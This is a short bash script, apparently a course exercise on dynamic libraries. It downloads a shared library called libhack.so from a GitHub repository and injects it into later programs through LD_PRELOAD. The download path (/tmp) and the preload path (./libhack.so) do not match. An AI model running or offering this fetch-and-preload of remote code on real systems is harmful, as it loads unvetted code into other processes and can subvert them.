#!/bin/bash
wget -P /tmp https://github.com/PimehT/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD=./libhack.so
